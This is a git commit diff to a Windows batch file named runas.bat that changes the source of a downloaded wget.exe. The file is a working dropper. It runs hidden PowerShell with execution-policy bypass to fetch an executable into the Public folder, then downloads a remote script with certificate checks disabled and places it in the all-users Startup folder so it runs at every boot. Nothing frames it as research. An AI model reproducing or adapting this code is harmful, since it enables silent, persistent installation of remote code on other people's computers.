e0e5a2c11ac68f9d1ba2246400c020a073d6bf0c
mediatui <57651467+mediatui@users.noreply.github.com>
2019-12-02 14:10:44 +1300

    Update runas.bat

--- Intel/runas.bat
+++ Intel/runas.bat
@@ -1,4 +1,4 @@
-cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/wget/1.20.3/64/wget.exe',\"$env:PUBLIC\wget.exe\")
+cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://github.com/mediatui/tool/raw/master/wget.exe',\"$env:PUBLIC\wget.exe\")
 setx wget "C:\Users\Public\wget.exe"
 setx startup "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 C:\Users\Public\wget.exe -q https://raw.githubusercontent.com/mediatui/tool/master/Intel/runonboot.cmd --no-check-certificate -O "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runonboot.cmd"
